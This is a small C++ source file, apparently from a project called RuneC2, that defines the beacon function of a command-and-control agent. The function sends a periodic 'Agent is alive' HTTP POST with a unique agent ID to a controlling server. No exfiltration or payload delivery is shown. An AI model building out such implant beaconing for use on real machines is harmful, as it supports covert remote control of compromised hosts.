//this file will contain the agent functions for the RuneC2 agents
#include "myfunctions.h"
#include <iostream>
#include <thread>
#include <chrono>

//This function is the beacon. This will periodically send a "live" signal to the satellite server via  HTTP POST request
// Simple stub implementation: prints a "live" message a few times.
// Replace with a real HTTP POST implementation (e.g., using libcurl) when integrating with the satellite server.
void agentbeaconFunction(const std::string& ip, int port){
	//for (int i = 0; i < 3; ++i) {
	//	std::cout << "Beacon: live\n";
	//	std::this_thread::sleep_for(std::chrono::seconds(5));
	//}

	std::string id = buildUniqueID();
    std::string host = ip;  // Use the passed IP parameter
    std::string endpoint = "/beacon/status";
    std::string sendData = "Agent is alive";
    char validate = 'y';

    sendPostRequest(host, port, endpoint, sendData, id, validate);
}